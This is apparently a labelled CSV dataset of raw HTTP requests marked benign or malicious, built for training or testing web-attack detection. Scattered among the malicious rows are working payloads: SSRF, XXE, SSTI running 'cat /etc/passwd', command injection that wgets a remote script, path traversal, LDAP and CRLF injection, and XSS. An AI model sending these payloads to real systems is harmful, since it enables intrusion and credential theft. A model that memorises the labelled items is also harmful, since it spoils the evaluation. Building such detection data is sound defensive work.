label,text
benign,"GET /files/../images/logo.png HTTP/1.1
Host: data-visualization-suite.com
Accept: image/*,*/*;q=0.6
Accept-Language: de-DE,de;q=0.9,en-US;q=0.7,en;q=0.4
If-None-Match: ""358a45f6b7a1d9c9f8a7d7a7f5""
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"GET /videos/search?query=outdoor+""yoga+session""+for+beginners&duration=30+minutes HTTP/1.1
Host: wellness-streams.tv
Accept: text/html
Accept-Language: en;q=0.9
Referer: https://wellness-streams.tv/homepage
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"GET /v1/images/transform?imageUrl=http%3A%2F%2Fcdn.secure-pic-delivery.net%2Fgallery%2F2021%2Fmountain.png&imageUrl=http%3A%2F%2F127.0.0.1%2Finternal%2Fhealthcheck&effect=blur HTTP/1.1
Host: cdn.secure-pic-delivery.net
User-Agent: Python-urllib/3.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: online-retail-store.biz
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
DNT: 1
Connection: keep-alive"
benign,"GET /v2/docs/openapi.json HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept-Language: en-US,en;q=0.9"
benign,"POST /contact/send HTTP/1.1
Host: connectwise-support.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://connectwise-support.net/contact
Origin: https://connectwise-support.net
Cookie: session_id=ks84jfh3209dufjh2s87whr9fh
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

name=Alice+Harper&email=alice.harper%40connectwise-support.net&subject=Inquiry+about+service+plans&message=Hello%2C+I+am+interested+in+learning+more+about+your+enterprise+service+plans.+Please+send+details.+Thank+you."
benign,"GET /assets/icons/notification.svg HTTP/1.1
Host: fintech-cloud-services.org
If-None-Match: W/""d41d8cd98f00b204e9800998ecf8427e""
Accept: image/svg+xml,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"HEAD /store/sale/summer-collection HTTP/1.1
Host: fashion-forward-retail.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
DNT: 1
Connection: keep-alive"
benign,"PUT /upload/storage/backups/weekly/2024-04-21-archive.bin HTTP/1.1
Host: backup-networks.cloud
User-Agent: python-requests/2.31.0
Content-Type: application/octet-stream
Content-Length: 306
Authorization: ApiKey 8ac9a7edb1fa45387ae8fde1b623224c
Accept: application/json
Via: 1.1 backup-networks.cloud-proxy

VGhpcyBpcyBhIGJpbmFyeSBhcmNoaXZlIGZpbGUgcmVwcmVzZW50aW5nIHRoZSByZWd1bGFyIGNvbnRlbnQgb2YgdGhlIGJhY2t1cCBvZiB1c2VyIGRhdGEu"
benign,"GET /news/2024/04/innovative-urban-gardening HTTP/1.1
Host: greencity-living.co
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: tech-support-hub.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36
Accept: text/plain
Content-Type: text/plain
Content-Length: 33
Referer: https://tech-support-hub.com/dashboard
Connection: keep-alive

Patch note: resolved issue with sync."
benign,"GET /products/office/chairs HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Cookie: cart_id=3761af28; user_sess=421f9d877a; last_visited=2024-05-22T16%3A20%3A42Z
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36"
benign,"GET /offers?ref=weekly_promo&utm_medium=email&utm_source=newsletters HTTP/1.1
Host: discount-deals-online.net
Connection: close
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://discount-deals-online.net/home
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
malicious,"POST /session/update HTTP/1.1
Host: auth.enterprisecloud-dash.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Content-Type: text/plain
Content-Length: 92
Cache-Control: no-cache
Cookie: sessionid=2ade3f8a4be34a0ea029db2f1ecb6b54

user%5Bemail%5D=enterprise_user%40enterprisecloud-dash.net&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=12&user%5Broles%5D%5B%5D=15"
benign,"POST /login HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Accept-Language: en-US,en;q=0.5
Connection: close
Referer: https://community.game-dev-forum.org/login
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36

username=charlie_dev&password=PixelMaster88&callback=%2Fuser%2Fcharlie_dev%2Fprofile%2Foverview"
benign,"GET /user/profile/view?id=59%4a%5b%6C%7d2f3 HTTP/1.1
Host: membership.secure-user-portal.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /api/data/report?year=2023&region=us-east HTTP/1.1
Host: secure-analytics-pro.io
X-Forwarded-For: 192.168.43.12
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-N976U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /resource/load?path=static/js/vendor/jquery.min.js HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.88.1
Accept: */*
Connection: close
Accept-Encoding: gzip, deflate"
benign,"GET /blog/tech/podcast-recap-june HTTP/1.1
Host: wired-insights.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Upgrade-Insecure-Requests: 1
Referer: https://wired-insights.io/blog/tech
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
benign,"POST /auth/session HTTP/1.1
Host: signup.lifestyle-healthcare.co.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 90
Connection: keep-alive
User-Agent: Mozilla/5.0 (Android 12; Mobile; rv:112.0) Gecko/112.0 Firefox/112.0
Accept-Language: en-GB,en;q=0.9
Referer: https://signup.lifestyle-healthcare.co.uk/login

user_email=brian.lawson%40lifestyle-healthcare.co.uk&password=Healing!#808&redirect_uri=https%3A%2F%2Flifestyle-healthcare.co.uk%2Fdashboard"
benign,"POST /log HTTP/1.1
Host: trackuser-data.cloud-metrics.ai
Origin: https://portal.cloud-metrics.ai
Content-Type: text/plain
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1
Content-Length: 38

event=click&target=subscribe_button&uid=4589"
benign,"PUT /api/user/957/profile HTTP/1.1
Host: digital-photo-sharing.club
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Content-Type: application/json
Content-Length: 102
Via: 1.1 photo-crawler
Connection: close

{""userProfile"": {""bioInfo"": ""Photo lover &amp; editor &lt;i&gt;sharing moments&lt;/i&gt; worldwide.""}}"
malicious,"POST /auth/redirect HTTP/1.1
Host: api-redirect-service.my-personal-blog-site.info
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://my-personal-blog-site.info/login
Cache-Control: max-age=0
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"GET /news/today-top HTTP/1.1
Host: global-info-streaming.ai
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.8,image/webp,*/*;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Referer: https://global-info-streaming.ai/news
Cookie: user_prefs_b64=eyJoZWFkZXIiOiJDbGllbnQiLCJucmMiOnRydWV9; tracking_id=7dfXc2LhNq0=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
benign,"POST /api/v2/feedback/submit HTTP/1.1
Host: feedback-central.techportal.biz
Content-Type: multipart/form-data; boundary=----BoundaryX9823ysd7f91
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.8
Connection: close
Origin: https://feedback-central.techportal.biz
Content-Length: 244

------BoundaryX9823ysd7f91
Content-Disposition: form-data; name=""page""

settings
------BoundaryX9823ysd7f91
Content-Disposition: form-data; name=""rating""

5
------BoundaryX9823ysd7f91
Content-Disposition: form-data; name=""comment""

The new interface is intuitive and easy to navigate.
------BoundaryX9823ysd7f91
Content-Disposition: form-data; name=""email""

lucy.smith@techportal.biz
------BoundaryX9823ysd7f91--"
benign,"POST /media/upload/batch HTTP/1.1
Host: secure-gigglestream.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: */*
Accept-Language: en-US,en;q=0.9
Content-Type: multipart/form-data; boundary=----ABC123XYZboundary
Connection: close
X-CSRF-Token: qJKFwlL3Ur7H9PsmS4aV
Content-Length: 8896

------ABC123XYZboundary
Content-Disposition: form-data; name=""image1""; filename=""birthday_cake.jpeg""
Content-Type: image/jpeg

<JPEG binary data: 199845 bytes>
------ABC123XYZboundary
Content-Disposition: form-data; name=""image2""; filename=""concert_ticket.png""
Content-Type: image/png

<PNG binary data: 125487 bytes>
------ABC123XYZboundary
Content-Disposition: form-data; name=""image3""; filename=""selfie_daytrip.bmp""
Content-Type: image/bmp

<BMP binary data: 345228 bytes>
------ABC123XYZboundary--"
benign,"GET /explore/photos?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: urban-photo-archive.io
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://urban-photo-archive.io/explore
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"HEAD /about/team HTTP/1.1
Host: nextgen-cloud-solutions.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/114.0.1823.43 Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /news/2024/07/15/latest-updates HTTP/1.1
Host: global-tidings.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.8
Accept-Language: en-GB,en;q=0.9,es;q=0.6
Accept-Encoding: gzip, deflate
Referer: https://global-tidings.net/
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; session=abcd1234efgh5678
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-CH-UA: ""Safari"";v=""16"", ""Not-A.Brand"";v=""99"", ""Apple"";v=""16""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document"
benign,"POST /api/v1/contact HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/xml
Content-Length: 114
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/xml, application/xml
Referer: https://community.game-dev-forum.org/help
Connection: keep-alive

<contact><name>Julian Marks</name><email>julian.marks@gdforums.org</email><message>Looking forward to the new dev toolkit release!</message></contact>"
benign,"POST /api/v1/users/profile/image HTTP/1.1
Host: media-storage.cloud-photo-hub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 234
Connection: keep-alive

{""userId"": ""c4fdee11-87ae-4570-a972-ee3f9ec8fdf6"", ""imageData"": ""iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBwYWludC5uZXQgNC4wLjE2Q1VTNUI5NgAAAJBJREFUOE9j/M/AwPCfgP4z8DAv6UENfiHi8ABMR+PnyHhgAfXgIVPzw/iywyMTCxAvL7AwP/wExGO4gQG/i4DYJzGLFYr0wESMDH/Ie/A4mAIAyYsAMXuLcQ9DA/6UBdASdgjkYwMAwA6XnkWHypvtXwAAAABJRU5ErkJggg==""}"
malicious,"GET /services/image/render?format=webp&imageUrl=http%3A%2F%2Fcdn-pics.online-retail-store.biz%2Fprod%2Fcover1.webp&imageUrl=http%3A%2F%2Flocalhost%2Fadmin%2Fpanel HTTP/1.1
Host: cdn-pics.online-retail-store.biz
User-Agent: Python-urllib/3.8
Accept: image/webp,image/apng,image/*,*/*;q=0.8"
benign,"POST /api/v5/shipment/status HTTP/1.1
Host: logistics-interop-services.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Type: application/soap+xml
Content-Length: 402
Accept: application/soap+xml, application/xml
Referer: https://logistics-interop-services.org/track
Connection: keep-alive

<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
 <soap:Body>
  <CheckShipmentStatus xmlns=""http://logistics-interop-services.org/api"">
   <TrackingNumber>SHIP987654321</TrackingNumber>
  </CheckShipmentStatus>
 </soap:Body>
</soap:Envelope>"
benign,"POST /polls/castvote HTTP/1.1
Host: neighborhood-voices.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Referer: https://neighborhood-voices.info/polls
Connection: keep-alive

poll_id=56&choice_id=4"
benign,"GET /catalog/fashion/spring-collection-2024 HTTP/1.1
Host: urban-style-boutique.io
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: 198.51.100.42
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 162
Accept: application/json
User-Agent: Python-urllib/3.9

{""query"":""latest gadgets"",""filters"":{""promo"":""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}}"
benign,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.79.1
Accept: application/json
Content-Type: application/json
Content-Length: 73
Connection: keep-alive

{""keywords"":[""laptop"",""ssd"",""USB-C"",""16GB RAM""],""sortOrder"":""relevance""}"
malicious,"PUT /api/configureDevice HTTP/1.1
Host: secure-device-mgmt.org
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Content-Length: 154
Origin: https://secure-device-mgmt.org

{""device_name"":""sensor-77"",""command"":""restart || wget http://malicious-update.cloud-data-services.ai/update.sh -O /tmp/update.sh"",""auth_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9""}"
benign,"GET /filesafe/download?file=report-final.pdf HTTP/1.1
Host: safe-docs-cloud.tech
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/pdf
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Connection: close
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"GET /media/images/banner-header.jpg HTTP/1.1
Host: assets-secure-streaming.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
If-Modified-Since: Tue, 30 May 2023 15:42:17 GMT
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /docs/openapi.json HTTP/1.1
Host: enterprise.hr-solutions.us
Accept: application/json
User-Agent: curl/7.85.0
Connection: close"
malicious,"POST /api/v2/user/notifications/send HTTP/1.1
Host: portal-enterprise-cloud.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Origin: https://portal-enterprise-cloud.io
Content-Length: 249

{""recipient"":""j.sanders@portal-enterprise-cloud.io"",""subject"":""Monthly Summary"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",""priority"":""high""}"
benign,"POST /api/log HTTP/1.1
Host: health-tracker.cloudfitnesstracker.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: application/json
Content-Length: 310

{""event"": ""workout_session_end"", ""session"": {""userId"": ""usr7654321"", ""startTime"": ""2024-06-10T05:30:00Z"", ""endTime"": ""2024-06-10T06:15:00Z"", ""exercises"": [{""name"": ""cycling"", ""durationMin"": 30}, {""name"": ""stretching"", ""durationMin"": 15}], ""caloriesBurned"": 310}, ""device"": {""model"": ""FitPlus Pro"", ""os"": ""iOS 16.4""}}"
malicious,"GET /user/avatar/..%2F..%2F..%2F..%2Fproc/self/environ HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://online-retail-store.biz/cart/view"
benign,"PATCH /v3/orders/7721/ HTTP/1.1
Host: retail-fastbuy.ai
Authorization: Bearer ZHXAmKJFG8U271WOIEP9
Content-Type: application/json-patch+json
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://retail-fastbuy.ai/orders

[{""op"": ""replace"", ""path"": ""/shipping/address/street"", ""value"": ""412 Evergreen Terrace""}, {""op"": ""add"", ""path"": ""/notes"", ""value"": ""Customer prefers morning delivery.""}]"
malicious,"POST /user/profile/update HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Origin: https://community.game-dev-forum.org
Content-Length: 245

{""username"":""pixelSorcerer"",""title"":""Master Coder"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""}"
benign,"DELETE /api/v4/projects/8347 HTTP/1.1
Host: api.secure-user-portal.net
Authorization: Bearer ghp_Lj49xws9KD7rpz2V4ByfXRLsNcJxgranT7Zd
If-Match: ""b4f631c""
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"POST /v1/search/ldap HTTP/1.1
Host: identity-authentication.cloudworks.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json, */*
Content-Length: 98

{""searchFilter"": ""(uid=mobileuser)(objectClass=inetOrgPerson))(|(uid=administrator)""}"
benign,"POST /api/v2/mail/subscribe HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json
Content-Length: 74
Cookie: session_token=3af8e074b1cfa83b6057645d7ecc127b

{""subscriberEmails"":[""newcustomer@onlineretail.biz"",""vipshopper@onlineretail.biz""]}"
malicious,"GET /login?redirect=%2Fhome%3Fsession%3Dactive%250d%250aSet-Cookie%3A%20isAdmin%3Dtrue%3B%20HttpOnly%3B%20Secure HTTP/1.1
Host: user-access-portal.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://user-access-portal.co.uk/login
Cache-Control: max-age=0"
benign,"HEAD /index.html HTTP/1.1
Host: mobile-media-streaming.io
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: tech-news-hub.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: br, gzip, deflate
Referer: https://tech-news-hub.net/articles/latest
Cookie: sessionId=4f8b2e679cd9a5b3d7e6fd3a70391abc"
malicious,"POST /api/v1/input/validate HTTP/1.1
Host: input-checker.tech-services.ai
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: text/plain
Content-Length: 260

validation_input=validInputData%40example.com"
benign,"POST /api/v1/user/profile/update HTTP/1.1
Host: portal-data-analytics.io
Connection: keep-alive
Content-Type: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Length: 123
Cookie: sessionid=34b2daf609efb8b12ad9c6e7ef1b1d03; prefs=dark_mode:true

{""displayName"":""jane_doe92"",""emailNotifications"":true,""timezone"":""America/New_York""}"
malicious,"POST /data/api/submit HTTP/1.1
Host: registry.healthcare-services.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: application/xml
Content-Type: application/xml
Content-Length: 210
Cache-Control: no-cache
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE submission [
<!ENTITY xxe_ssrf SYSTEM ""http://192.168.0.254:8080/config"" >
]>
<submission>
  <details>&xxe_ssrf;</details>
</submission>"
benign,"PUT /api/v1/blog/posts/88ab12/comments/459ba HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer laczv9xb21qpwmo1dsye
Origin: https://my-personal-blog-site.info
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: Python-urllib/3.11
Content-Length: 75

{""comment"": ""Thanks for the insightful article! Looking forward to your next post."", ""like"": true}"
malicious,"POST /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/app/user/settings
Connection: keep-alive

username=guest&action=view&comment=normal_comment&username=administrator&action=delete&comment=%3Cscript%3Exss()%3C%2Fscript%3E"
benign,"OPTIONS /api/v5/report/generate HTTP/1.1
Host: analytics-dataflow.biz
Origin: https://reports.fintech-analytics.ai
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,authorization
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
